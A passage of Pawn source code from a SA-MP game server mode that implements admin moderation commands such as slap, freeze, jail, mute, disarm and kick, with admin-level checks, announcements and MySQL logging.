					SendClientMessage(playerid, COLOR_ORANGE, "¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯");
				}
			}
			return 1;
    		}
   case 4: {
			switch(player[playerid][ADMIN])
			{
				case 1:
				{
			       	SendClientMessage(playerid, COLOR_RED, "No more further commands for admin level 1.");
				}
				case 2:
				{
			       	SendClientMessage(playerid, COLOR_RED, "No more further commands for admin level 2.");
				}
				case 3:
				{
					SendClientMessage(playerid, COLOR_ORANGE, "___________________ P4:L3 Admin Commands:___________________");
					SendClientMessage(playerid, COLOR_ORANGE, "| /forcesay <n|id> <text> - Force player to say text");
					SendClientMessage(playerid, COLOR_ORANGE, "| /forceirc <fakename> <text> - Fake irc text");
  					SendClientMessage(playerid, COLOR_ORANGE, "| /(un)block <n|id> - Block player cmds");
    				SendClientMessage(playerid, COLOR_ORANGE, "| /ban <n|id> <reason> - Ban player");
    				SendClientMessage(playerid, COLOR_ORANGE, "| /info <name/id> - Get private info");
    				SendClientMessage(playerid, COLOR_ORANGE, "| /ip/host/namematch(2) <ip/host/name> - Find smiliar matches");
					SendClientMessage(playerid, COLOR_ORANGE, "¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯");
				}
				case 4:
				{
					SendClientMessage(playerid, COLOR_ORANGE, "___________________ P4:L4 Admin Commands:___________________");
					SendClientMessage(playerid, COLOR_ORANGE, "| /akill|explode|bigbang(2) <n|id> - *");
					SendClientMessage(playerid, COLOR_ORANGE, "| /forcesay <n|id> <text> - Force player to say text");
					SendClientMessage(playerid, COLOR_ORANGE, "| /forceirc <fakename> <text> - Fake irc text");
					SendClientMessage(playerid, COLOR_ORANGE, "| /forcecmd <n|id> <cmd> - Force player to enter command");
  					SendClientMessage(playerid, COLOR_ORANGE, "| /force(s)anim <n|id/all> <anim cmd + #> - Force animation");
  					SendClientMessage(playerid, COLOR_ORANGE, "| /forceseat <n|id/out> <seatID> - Force player in seat");
  					SendClientMessage(playerid, COLOR_ORANGE, "| /forcepostick <n|id/all> ... - Force player a postick");
     				SendClientMessage(playerid, COLOR_ORANGE, "| /ban <n|id> <reason> - Ban player");
					SendClientMessage(playerid, COLOR_ORANGE, "¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯");
				}
				case 5,6:
				{
					SendClientMessage(playerid, COLOR_ORANGE, "___________________ P4:L5 Admin Commands:___________________");
					SendClientMessage(playerid, COLOR_ORANGE, "| /akill|explode|bigbang(2) <n|id> - *");
					SendClientMessage(playerid, COLOR_ORANGE, "| /forcesay <n|id> <text> - Force player to say text");
					SendClientMessage(playerid, COLOR_ORANGE, "| /forceirc <fakename> <text> - Fake irc text");
					SendClientMessage(playerid, COLOR_ORANGE, "| /forcecmd <n|id> <cmd> - Force player to enter command");
					SendClientMessage(playerid, COLOR_ORANGE, "| /force(s)anim <n|id/all> <anim cmd + #> - Force animation");
					SendClientMessage(playerid, COLOR_ORANGE, "| /forceseat <n|id/out> <seatID> - Force player in seat");
  					SendClientMessage(playerid, COLOR_ORANGE, "| /forcepostick <n|id/all> ... - Force player a postick");
                    SendClientMessage(playerid, COLOR_ORANGE, "| /ban <n|id> <reason> - Ban player");
					SendClientMessage(playerid, COLOR_ORANGE, "¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯");
				}
			}
			return 1;
  			}
   case 5: {
			switch(player[playerid][ADMIN])
			{
				case 1:
				{
			       	SendClientMessage(playerid, COLOR_RED, "No more further commands for admin level 1.");
				}
				case 2:
				{
			       	SendClientMessage(playerid, COLOR_RED, "No more further commands for admin level 2.");
				}
				case 3:
				{
			       	SendClientMessage(playerid, COLOR_RED, "No more further commands for admin level 3.");
				}
				case 4:
				{
					SendClientMessage(playerid, COLOR_ORANGE, "___________________ P5:L4 Admin Commands:___________________");
    				SendClientMessage(playerid, COLOR_ORANGE, "| /info <name/id> - Get private info");
    				SendClientMessage(playerid, COLOR_ORANGE, "| /ip/host/namematch(2) <ip/host/name> - Find smiliar matches");
  					SendClientMessage(playerid, COLOR_ORANGE, "| /(un)block <n|id> - Block player cmds");
					SendClientMessage(playerid, COLOR_ORANGE, "| /gmx - Restart gamemode");
					SendClientMessage(playerid, COLOR_ORANGE, "¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯");
				}
				case 5,6:
				{
					SendClientMessage(playerid, COLOR_ORANGE, "___________________ P5:L5 Admin Commands:___________________");
    				SendClientMessage(playerid, COLOR_ORANGE, "| /info <name/id> - Get private info");
    				SendClientMessage(playerid, COLOR_ORANGE, "| /ip/host/namematch(2) <ip/host/name> - Find smiliar matches");
  					SendClientMessage(playerid, COLOR_ORANGE, "| /(un)block <n|id> - Block player cmds");
 					SendClientMessage(playerid, COLOR_ORANGE, "| /gmx - Restart gamemode");
     				SendClientMessage(playerid, COLOR_ORANGE, "| /set|removevip <n|id> - Give/Remove player VIP");
    	            SendClientMessage(playerid, COLOR_ORANGE, "| /set|removeadmin <n|id> (<level>) - Give/remove player admin");
	                SendClientMessage(playerid, COLOR_ORANGE, "| /setlevel <n|id> <level> - Set player's admin level");
					SendClientMessage(playerid, COLOR_ORANGE, "¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯");
				}
			}
			return 1;
  		}
	}
	return 1;*/
}

dcmd_slap(playerid,params[])
{
	if (!IsPlayerAdminLevel(playerid, 4)) { if (!AntiSpam(playerid, 10)) return 1; }

	new idx;

	tmps2 = strtok(params, idx);
	if (!strlen(tmps2))
	return SendClientMessage(playerid, COLOR_WHITE , "[USAGE]: /slap <name|id>");

	if (!IsNumeric(tmps2)) giveplayerid = ReturnPlayerID(tmps2);
	else giveplayerid = strval(tmps2);

	if (!IsPlayerConnected(giveplayerid) || giveplayerid == INVALID_PLAYER_ID)
	return SendErrorMessage(playerid, EMBED_WHITE, "This player is not connected.");

 	if (player[playerid][ADMIN] < player[giveplayerid][ADMIN])
	return SendErrorMessage(playerid, EMBED_WHITE, "This player has higher priveleges than you. Action cancelled.");

	GetPlayerName(playerid, playername, sizeof(playername));
	GetPlayerName(giveplayerid, giveplayername, sizeof(giveplayername));

	if (player[playerid][hideadmin] == 1)
	{
		format(strings, sizeof(strings), "%s has been slapped by God.", giveplayername);
		SendServerMessageToAll(EMBED_YELLOW, strings);
		format(strings, sizeof(strings), "4[!]7 %s has been slapped by God.", giveplayername);
	} else {
		format(strings, sizeof(strings), "Admin %s has slapped %s", playername, giveplayername);
		SendServerMessageToAll(EMBED_YELLOW, strings);
		format(strings, sizeof(strings), "4[!]7 Admin %s has slapped %s", playername, giveplayername);
	}
  	IRC_GroupSay(1, IRC_CHANNEL, strings);
	player[giveplayerid][antifall] = 0;
	player[giveplayerid][godmode] = 0;
    SetPlayerHealth(giveplayerid, 100.0);
	GetPlayerPos(giveplayerid, playerxyza[0], playerxyza[1], playerxyza[2]);
	SetPlayerPos(giveplayerid, playerxyza[0], playerxyza[1], playerxyza[2]+10);
	SendCommandMessageToAdmins(playerid, "slap");

	for (new i = 0; i < MAX_PLAYERS; i++)
	{
	    if (IsPlayerConnected(i))
		PlayerPlaySound(i, 1190, 0.0, 0.0, 0.0);
	}
	return 1;
}

dcmd_hide(playerid,params[])
{
	#pragma unused params

	GetPlayerName(playerid, playername, sizeof(playername));
	if (player[playerid][hideadmin] == 1)
	{
        player[playerid][hideadmin] = 0;
        SendClientMessage(playerid, COLOR_ORANGE, "[SUCCESS]: You are now NOT hidden from the admin list.");
	} else {
		player[playerid][hideadmin] = 1;
		SendClientMessage(playerid, COLOR_ORANGE, "[SUCCESS]: You are now hidden from the admin list.");
	}
	SendCommandMessageToAdmins(playerid, "hide");

	if (IsPlayerRegistered(playerid))
	{
		new mysqlStr[101];
		format(mysqlStr, sizeof(mysqlStr), "UPDATE "MYSQL_TABLE_PREFERENCES" SET `preference_hide` = %d WHERE account_id = %d LIMIT 1", player[playerid][hideadmin], GetPlayerAccountID(playerid));
		mysql_run_query(mysqlConnection, mysqlStr, false, "", "");
	}
	return 1;
}

dcmd_togglemsg(playerid,params[])
{
	#pragma unused params

	GetPlayerName(playerid, playername, sizeof(playername));
	if (player[playerid][adminmsgs] == 1)
	{
        player[playerid][adminmsgs] = 0;
        SendClientMessage(playerid, COLOR_ORANGE, "[SUCCESS]: Certain admin messages will not show anymore.");
	} else {
		player[playerid][adminmsgs] = 1;
		SendClientMessage(playerid, COLOR_ORANGE, "[SUCCESS]: All admin messages will show again.");
	}
	SendCommandMessageToAdmins(playerid, "togglemsg");
	return 1;
}

dcmd_givemoney(playerid,params[])
{
    new idx,
		moneys;

	tmps2 = strtok(params, idx);
	if (!strlen(tmps2))
	return SendClientMessage(playerid, COLOR_WHITE , "[USAGE]: /givemoney <name|id> <amount>");

	if (!IsNumeric(tmps2)) giveplayerid = ReturnPlayerID(tmps2);
	else giveplayerid = strval(tmps2);

	tmps2 = strtok(params, idx);
	if (!strlen(tmps2) || !IsNumeric(tmps2))
	return SendClientMessage(playerid, COLOR_WHITE , "[USAGE]: /givemoney <name|id> <amount>");
	moneys = strval(tmps2);

	if (moneys < 0)
	return SendErrorMessage(playerid, EMBED_WHITE, "You cannot give a negative amount of money");

	if (IsPlayerConnected(giveplayerid) && giveplayerid != INVALID_PLAYER_ID)
	{
		if (!IsPlayerSpawned(giveplayerid))
		return SendErrorMessage(playerid, EMBED_WHITE, "This player didn't spawn yet.");

		GivePlayerMoney(giveplayerid, moneys);
		SendCommandMessageToAdmins(playerid, "givemoney");
	} else SendErrorMessage(playerid, EMBED_WHITE, "This player is not connected.");
	return 1;
}

dcmd_disarm(playerid,params[])
{
	new idx;

	tmps2 = strtok(params, idx);
 	if (!strlen(tmps2))
 	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /disarm <name|id/all>");

	if (!strcmp(tmps2, "all", true))
	{
		for (new i = 0; i < MAX_PLAYERS; i++)
		{
		    if (IsPlayerConnected(i) && !IsPlayerInDMSPJA(i))
			ResetPlayerWeapons(i);
		}
		SendCommandMessageToAdmins(playerid, "disarm");
		return 1;
	}

	if (!IsNumeric(tmps2)) giveplayerid = ReturnPlayerID(tmps2);
	else giveplayerid = strval(tmps2);

	if (IsPlayerConnected(giveplayerid) && giveplayerid != INVALID_PLAYER_ID)
	{
		if (!IsPlayerSpawned(giveplayerid))
		return SendErrorMessage(playerid, EMBED_WHITE, "This player didn't spawn yet.");

		ResetPlayerWeapons(giveplayerid);
 		SendCommandMessageToAdmins(playerid, "disarm");
	} else SendErrorMessage(playerid, EMBED_WHITE, "This player is not connected.");
	return 1;
}

dcmd_setworld(playerid,params[])
{
    new idx,
		vworldid;

	tmps2 = strtok(params, idx);
 	if (!strlen(tmps2))
 	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /setworld <name|id/all> <worldid>");

	if (!strcmp(tmps2, "all", true))
	{
	    if (!strlen(params[strlen(tmps2)+1]))
	    return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /setworld <name|id/all> <worldid>");

	    if (!IsNumeric(params[strlen(tmps2)+1]))
	    return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /setworld <name|id/all> <worldid>");

		for (new i = 0; i < MAX_PLAYERS; i++)
		{
		    if (IsPlayerConnected(i))
		    {
				SetPlayerVirtualWorld(i, vworldid);
				if (IsPlayerInAnyVehicle(i)) SetVehicleVirtualWorld( GetPlayerVehicleID(i), vworldid);
			}
		}
		SendCommandMessageToAdmins(playerid, "setworld");
		return 1;
	}

	if (!IsNumeric(tmps2)) giveplayerid = ReturnPlayerID(tmps2);
	else giveplayerid = strval(tmps2);

	tmps2 = strtok(params, idx);
 	if (!strlen(tmps2) || !IsNumeric(tmps2))
 	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /setworld <name|id/all> <worldid>");
	vworldid = strval(tmps2);

	if (IsPlayerConnected(giveplayerid) && giveplayerid != INVALID_PLAYER_ID)
	{
		if (!IsPlayerSpawned(giveplayerid))
		return SendErrorMessage(playerid, EMBED_WHITE, "This player didn't spawn yet.");

		SetPlayerVirtualWorld(giveplayerid, vworldid);
		if (IsPlayerInAnyVehicle(giveplayerid)) SetVehicleVirtualWorld( GetPlayerVehicleID(giveplayerid), vworldid);
		SendCommandMessageToAdmins(playerid, "setworld");
	} else SendErrorMessage(playerid, EMBED_WHITE, "This player is not connected.");
	return 1;
}

dcmd_setinterior(playerid,params[])
{
    new idx,
		interiorid;

	tmps2 = strtok(params, idx);
 	if (!strlen(tmps2))
 	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /setinterior <name|id> <interiorid>");

	if (!IsNumeric(tmps2)) giveplayerid = ReturnPlayerID(tmps2);
	else giveplayerid = strval(tmps2);

	tmps2 = strtok(params, idx);
 	if (!strlen(tmps2) || !IsNumeric(tmps2))
 	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /setinterior <name|id> <interiorid>");
	interiorid = strval(tmps2);

	if (IsPlayerConnected(giveplayerid) && giveplayerid != INVALID_PLAYER_ID)
	{
		if (!IsPlayerSpawned(giveplayerid))
		return SendErrorMessage(playerid, EMBED_WHITE, "This player didn't spawn yet.");

		SetPlayerInterior(giveplayerid, interiorid);
		if (IsPlayerInAnyVehicle(playerid)) LinkVehicleToInterior( GetPlayerVehicleID(playerid), interiorid);
		SendCommandMessageToAdmins(playerid, "setinterior");
	} else SendErrorMessage(playerid, EMBED_WHITE, "This player is not connected.");
	return 1;
}

dcmd_forcespawn(playerid,params[])
{
    new idx;

	tmps2 = strtok(params, idx);
 	if (!strlen(tmps2))
 	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /forcespawn <name|id>");

	if (!IsNumeric(tmps2)) giveplayerid = ReturnPlayerID(tmps2);
	else giveplayerid = strval(tmps2);

	if (IsPlayerConnected(giveplayerid) && giveplayerid != INVALID_PLAYER_ID)
	{
		if (IsPlayerSpawned(giveplayerid))
		SendClientMessage(playerid, COLOR_IVORY, "[SUCCESS]: This player was spawned and has been respawned.");

		SpawnPlayer(giveplayerid);
		SendCommandMessageToAdmins(playerid, "forcespawn");
	} else SendErrorMessage(playerid, EMBED_WHITE, "This player is not connected.");
	return 1;
}

dcmd_forceclass(playerid,params[])
{
    new idx;

	tmps2 = strtok(params, idx);
 	if (!strlen(tmps2))
 	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /forceclass <name|id>");

	if (!IsNumeric(tmps2)) giveplayerid = ReturnPlayerID(tmps2);
	else giveplayerid = strval(tmps2);

	if (IsPlayerConnected(giveplayerid) && giveplayerid != INVALID_PLAYER_ID)
	{
		if (!IsPlayerSpawned(giveplayerid))
		SendClientMessage(playerid, COLOR_WHITE, "[INFO]: This player wasn't spawned.");

  		if (player[playerid][ADMIN] < player[giveplayerid][ADMIN])
		return SendClientMessage(playerid, COLOR_WHITE , "This player has higher priveleges than you. Action cancelled.");

		ForceClassSelection(giveplayerid);
		SetPlayerHealth(giveplayerid, 0.0);
		SendCommandMessageToAdmins(playerid, "forceclass");
	} else SendErrorMessage(playerid, EMBED_WHITE, "This player is not connected.");
	return 1;
}

dcmd_freeze(playerid,params[])
{
    new idx;

	tmps2 = strtok(params, idx);
 	if (!strlen(tmps2))
 	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /freeze <name|id>");

	if (!IsNumeric(tmps2)) giveplayerid = ReturnPlayerID(tmps2);
	else giveplayerid = strval(tmps2);

	if (IsPlayerConnected(giveplayerid) && giveplayerid != INVALID_PLAYER_ID)
	{
		if (!IsPlayerSpawned(giveplayerid))
		return SendErrorMessage(playerid, EMBED_WHITE, "This player didn't spawn yet.");

		if (giveplayerid == playerid)
	 	return SendErrorMessage(playerid, EMBED_WHITE, "Cannot freeze yourself.");

		if (player[giveplayerid][frozen] == 1)
	 	return SendErrorMessage(playerid, EMBED_WHITE, "This player is already frozen.");

		TogglePlayerControllable(giveplayerid, 0);
		player[giveplayerid][frozen] = 1;
	    GetPlayerName(playerid, playername, sizeof(playername));
		GetPlayerName(giveplayerid, giveplayername, sizeof(giveplayername));
		format(strings, sizeof(strings), "Admin %s froze %s (id: %d).", playername, giveplayername, giveplayerid);
		SendServerMessageToAll(EMBED_WHITE, strings);
		format(strings, sizeof(strings), "2Admin %s froze %s (id: %d).", playername, giveplayername, giveplayerid);
		IRC_GroupSay(1, IRC_CHANNEL, strings);
		SendCommandMessageToAdmins(playerid, "freeze");
	} else SendErrorMessage(playerid, EMBED_WHITE, "This player is not connected.");
	return 1;
}

dcmd_unfreeze(playerid,params[])
{
    new idx;

	tmps2 = strtok(params, idx);
 	if (!strlen(tmps2))
 	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /unfreeze <name|id>");

	if (!IsNumeric(tmps2)) giveplayerid = ReturnPlayerID(tmps2);
	else giveplayerid = strval(tmps2);

	if (IsPlayerConnected(giveplayerid) && giveplayerid != INVALID_PLAYER_ID)
	{
		if (!IsPlayerSpawned(giveplayerid))
		return SendErrorMessage(playerid, EMBED_WHITE, "This player didn't spawn yet.");

		if (giveplayerid == playerid)
	 	return SendErrorMessage(playerid, EMBED_WHITE, "Cannot unfreeze yourself.");

		if (player[giveplayerid][frozen] == 0)
	 	return SendErrorMessage(playerid, EMBED_WHITE, "This player isn't frozen.");

		TogglePlayerControllable(giveplayerid, 1);
		player[giveplayerid][frozen] = 0;
	    GetPlayerName(playerid, playername, sizeof(playername));
		GetPlayerName(giveplayerid, giveplayername, sizeof(giveplayername));
		format(strings, sizeof(strings), "Admin %s unfroze %s (id: %d).", playername, giveplayername, giveplayerid);
		SendServerMessageToAll(EMBED_WHITE, strings);
		format(strings, sizeof(strings), "2Admin %s unfroze %s (id: %d).", playername, giveplayername, giveplayerid);
		IRC_GroupSay(1, IRC_CHANNEL, strings);
		SendCommandMessageToAdmins(playerid, "unfreeze");
	} else SendErrorMessage(playerid, EMBED_WHITE, "This player is not connected.");
	return 1;
}

dcmd_jail(playerid,params[])
{
    new idx;

	tmps2 = strtok(params, idx);
	if (!strlen(tmps2))
	return SendClientMessage(playerid, COLOR_DARKRED , "[USAGE]: /jail <playerid>");

	if (!IsNumeric(tmps2)) giveplayerid = ReturnPlayerID(tmps2);
	else giveplayerid = strval(tmps2);

	if (IsPlayerConnected(giveplayerid) && giveplayerid != INVALID_PLAYER_ID)
	{
		if (giveplayerid == playerid)
		return SendErrorMessage(playerid, EMBED_WHITE, "You can't jail yourself!");

		if (!IsPlayerSpawned(giveplayerid))
		return SendErrorMessage(playerid, EMBED_WHITE, "This player didn't spawn yet.");

		if (player[giveplayerid][jailed] == 1)
		return SendErrorMessage(playerid, EMBED_WHITE, "That player is already jailed.");

  		if (player[playerid][ADMIN] < player[giveplayerid][ADMIN])
		return SendClientMessage(playerid, COLOR_WHITE , "This player has higher priveleges than you. Action cancelled.");

		player[giveplayerid][antifall] = 0;
		ResetPlayerWeapons(giveplayerid);
		player[giveplayerid][jailed] = 1;
		SetPlayerInterior(giveplayerid,0);
		SetPlayerPos(giveplayerid, 154.0770, -1951.9774, 47.8750);
		SetPlayerFacingAngle(giveplayerid, 0);
		GetPlayerName(giveplayerid, giveplayername, sizeof(giveplayername));
		GetPlayerName(playerid, playername, sizeof(playername));
		format(strings, sizeof(strings), "Admin %s has jailed %s (id: %d).", playername, giveplayername, giveplayerid);
		SendServerMessageToAll(EMBED_RED, strings);
		format(strings, sizeof(strings), "2Admin %s has jailed %s (id: %d).", playername, giveplayername, giveplayerid);
		IRC_GroupSay(1, IRC_CHANNEL, strings);
		SendCommandMessageToAdmins(playerid, "jail");
	} else SendErrorMessage(playerid, EMBED_WHITE, "This player is not connected.");
	return 1;
}

dcmd_unjail(playerid,params[])
{
    new idx;

	tmps2 = strtok(params, idx);
	if (!strlen(tmps2))
	return SendClientMessage(playerid, COLOR_DARKRED , "[USAGE]: /unjail <playerid>");

	if (!IsNumeric(tmps2)) giveplayerid = ReturnPlayerID(tmps2);
	else giveplayerid = strval(tmps2);

	if (IsPlayerConnected(giveplayerid) && giveplayerid != INVALID_PLAYER_ID)
	{
		if (giveplayerid == playerid)
		return SendErrorMessage(playerid, EMBED_WHITE, "You can't unjail yourself!");

		if (!IsPlayerSpawned(giveplayerid))
		return SendErrorMessage(playerid, EMBED_WHITE, "This player didn't spawn yet.");

		if (player[giveplayerid][jailed] == 0)
		return SendErrorMessage(playerid, EMBED_WHITE, "That player isn't jailed.");

		player[giveplayerid][jailed] = 0;
		SpawnPlayer(giveplayerid);
		GetPlayerName(playerid, playername, sizeof(playername));
  		GetPlayerName(giveplayerid, giveplayername, sizeof(giveplayername));
		format(strings, sizeof(strings), "Admin %s has unjailed %s (id: %d).", playername, giveplayername, giveplayerid);
		SendServerMessageToAll(EMBED_RED, strings);
		format(strings, sizeof(strings), "2Admin %s has unjailed %s (id: %d).", playername, giveplayername, giveplayerid);
		IRC_GroupSay(1, IRC_CHANNEL, strings);
		SendCommandMessageToAdmins(playerid, "unjail");
	} else SendErrorMessage(playerid, EMBED_WHITE, "This player is not connected.");
	return 1;
}

dcmd_mute(playerid,params[])
{
    new idx;

	tmps2 = strtok(params, idx);
	if (!strlen(tmps2))
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /mute <playerid/chat>");

	if (!strcmp(tmps2, "chat", true))
	{
		if (!IsPlayerAdminLevel(playerid, 4))
	    return SendErrorMessage(playerid, EMBED_WHITE, "This option is inacessible for your level.");

		if (mutedchat == true)
		return SendErrorMessage(playerid, EMBED_WHITE, "The global chat is already muted");

		mutedchat = true;
		GetPlayerName(playerid, playername, sizeof(playername));
		format(strings, sizeof(strings), "Admin %s has muted global chat.", playername);
		SendServerMessageToAll(EMBED_RED, strings);
		format(strings, sizeof(strings), "4Admin %s has muted global chat.", playername);
		IRC_GroupSay(1, IRC_CHANNEL, strings);
		SendCommandMessageToAdmins(playerid, "mute chat");
		return 1;
	}

	if (!IsNumeric(tmps2)) giveplayerid = ReturnPlayerID(tmps2);
	else giveplayerid = strval(tmps2);

	if (IsPlayerConnected(giveplayerid) && giveplayerid != INVALID_PLAYER_ID)
	{
		if (giveplayerid == playerid)
		return SendErrorMessage(playerid, EMBED_WHITE, "You can't mute yourself!");

		if (IsPlayerMuted(giveplayerid))
		return SendErrorMessage(playerid, EMBED_WHITE, "That player is already muted");

		if (player[playerid][ADMIN] < player[giveplayerid][ADMIN])
		return SendErrorMessage(playerid, EMBED_WHITE, "This player has higher priveleges than you. Action cancelled.");

		GetPlayerName(giveplayerid, giveplayername, sizeof(giveplayername));
		GetPlayerName(playerid, playername, sizeof(playername));

		player[giveplayerid][muted] = 1;
		format(strings, sizeof(strings), "Admin %s has muted %s (id: %d).", playername, giveplayername, giveplayerid);
		SendServerMessageToAll(EMBED_RED, strings);
		format(strings, sizeof(strings), "4Admin %s has muted %s (id: %d).", playername, giveplayername, giveplayerid);
		IRC_GroupSay(1, IRC_CHANNEL, strings);
		SendCommandMessageToAdmins(playerid, "mute");
	} else SendErrorMessage(playerid, EMBED_WHITE, "This player is not connected.");
	return 1;
}

dcmd_unmute(playerid,params[])
{
    new idx;

	tmps2 = strtok(params, idx);
	if (!strlen(tmps2))
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /unmute <playerid/all>");

	if (!strcmp(tmps2, "chat", true))
	{
		if (!IsPlayerAdminLevel(playerid, 4))
	    return SendErrorMessage(playerid, EMBED_WHITE, "This option is inacessible for your level.");

		if (mutedchat == false)
		return SendErrorMessage(playerid, EMBED_WHITE, "The global chat isn't muted");

	    mutedchat = false;
		GetPlayerName(playerid, playername, sizeof(playername));
		format(strings, sizeof(strings), "Admin %s has unmuted global chat.", playername);
		SendServerMessageToAll(EMBED_RED, strings);
		format(strings, sizeof(strings), "4Admin %s has unmuted global chat.", playername);
		IRC_GroupSay(1, IRC_CHANNEL, strings);
		SendCommandMessageToAdmins(playerid, "unmute chat");
		return 1;
	}

	if (!IsNumeric(tmps2)) giveplayerid = ReturnPlayerID(tmps2);
	else giveplayerid = strval(tmps2);

	if (IsPlayerConnected(giveplayerid) && giveplayerid != INVALID_PLAYER_ID)
	{
		if (giveplayerid == playerid)
		return SendErrorMessage(playerid, EMBED_WHITE, "You can't unmute yourself!");

		if (!IsPlayerMuted(giveplayerid))
		return SendErrorMessage(playerid, EMBED_WHITE, "That player isn't muted");

		GetPlayerName(giveplayerid, giveplayername, sizeof(giveplayername));
		GetPlayerName(playerid, playername, sizeof(playername));
		player[giveplayerid][muted] = 0;
		format(strings, sizeof(strings), "Admin %s has unmuted %s.", playername, giveplayername);
		SendServerMessageToAll(EMBED_RED, strings);
		format(strings, sizeof(strings), "4Admin %s has unmuted %s.", playername, giveplayername);
		IRC_GroupSay(1, IRC_CHANNEL, strings);
		SendCommandMessageToAdmins(playerid, "unmute");
	} else SendErrorMessage(playerid, EMBED_WHITE, "This player is not connected.");
	return 1;
}

dcmd_knife(playerid,params[])
{
    new idx;

	tmps2 = strtok(params, idx);
	if (!strlen(tmps2))
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /knife <playerid>");

	if (!IsNumeric(tmps2)) giveplayerid = ReturnPlayerID(tmps2);
	else giveplayerid = strval(tmps2);

	if (IsPlayerConnected(giveplayerid) && giveplayerid != INVALID_PLAYER_ID)
	{
		if (player[playerid][ADMIN] < player[giveplayerid][ADMIN])
		return SendErrorMessage(playerid, EMBED_WHITE, "This player has higher priveleges than you. Action cancelled.");

		if (!IsPlayerSpawned(giveplayerid))
		return SendErrorMessage(playerid, EMBED_WHITE, "This player didn't spawn yet.");

		GetPlayerPos(giveplayerid, playerxyza[0], playerxyza[1], playerxyza[2]);
	    GetXYInFrontOfPlayer(giveplayerid, playerxyza[0], playerxyza[1], 4.5);
	    SetPlayerCameraPos(giveplayerid, playerxyza[0], playerxyza[1], playerxyza[2]);
   		GetPlayerPos(giveplayerid, playerxyza[0], playerxyza[1], playerxyza[2]);
	    SetPlayerCameraLookAt(giveplayerid, playerxyza[0], playerxyza[1], playerxyza[2]);
	    GameTextForPlayer(giveplayerid, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~r~you mad?", 4000, 3);
	    TogglePlayerControllable(giveplayerid, 0);
	    ApplyAnimation(giveplayerid, "KNIFE", "KILL_Knife_Ped_Die", 4.1, 0, 1, 1, 1, 1);
	    SetTimerEx("SpawnPlayerEx1", 4000, 0, "i", giveplayerid);
		SendCommandMessageToAdmins(playerid, "knife");
	} else SendErrorMessage(playerid, EMBED_WHITE, "This player is not connected.");
	return 1;
}

dcmd_unlockall(playerid,params[])
{
	if (IsNumeric(params))
	{
	    new vID = strval(params);
		SetVehicleParamsForPlayerEx(vID, playerid, vehicle[vID][Objective], 0);

		SendClientMessage(playerid, COLOR_IVORY, "[SUCCESS]: Vehicle unlocked!");
	} else {
		for (new i = 1; i < MAX_VEHICLES; i++)
		SetVehicleParamsForPlayerEx(i, playerid, vehicle[i][Objective], 0);

		SendClientMessage(playerid, COLOR_IVORY, "[SUCCESS]: All vehicles have been unlocked!");
	}

	SendCommandMessageToAdmins(playerid, "unlockall");
	return 1;
}

dcmd_kick(playerid,params[])
{
    new idx;

	tmps2 = strtok(params, idx);
	if (!strlen(tmps2))
	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /kick <name|id> <reason>");

	if (!IsNumeric(tmps2)) giveplayerid = ReturnPlayerID(tmps2);
	else giveplayerid = strval(tmps2);

	if (IsPlayerConnected(giveplayerid) && giveplayerid != INVALID_PLAYER_ID)
	{
		if (player[playerid][ADMIN] < player[giveplayerid][ADMIN])
		return SendErrorMessage(playerid, EMBED_WHITE, "This player has higher priveleges than you. Action cancelled.");

		if (!IsPlayerAdminLevel(playerid, 3)) { if (!AntiSpam(playerid, 10)) return 1; }

	    if (!player[giveplayerid][RULEStextdraw])
		{
			TextDrawShowForPlayer(giveplayerid, nrules);
			player[giveplayerid][RULEStextdraw] = 1;
	    }

		GetPlayerName(playerid, playername, sizeof(playername));
		GetPlayerName(giveplayerid, giveplayername, sizeof(giveplayername));

		if (IsPlayerRegistered(giveplayerid) && IsPlayerLoggedIn(giveplayerid))
		{
			new mysqlStr[180];
			format(mysqlStr, sizeof(mysqlStr), "UPDATE "MYSQL_TABLE_PLAYER_LOGS" SET `player_log_kick_count` = player_log_kick_count +1, `player_log_warn_count` = player_log_warn_count +1 WHERE account_id = %d LIMIT 1", GetPlayerAccountID(giveplayerid));
			mysql_run_query(mysqlConnection, mysqlStr, false, "", "");
		}

		if (player[playerid][hideadmin] == 1)
		{
  			if (!strlen(params[strlen(tmps2)+1]))
		    {
  				if (!IsPlayerAdminLevel(playerid, 4))
				return SendErrorMessage(playerid, EMBED_WHITE, "Enter a valid reason.");

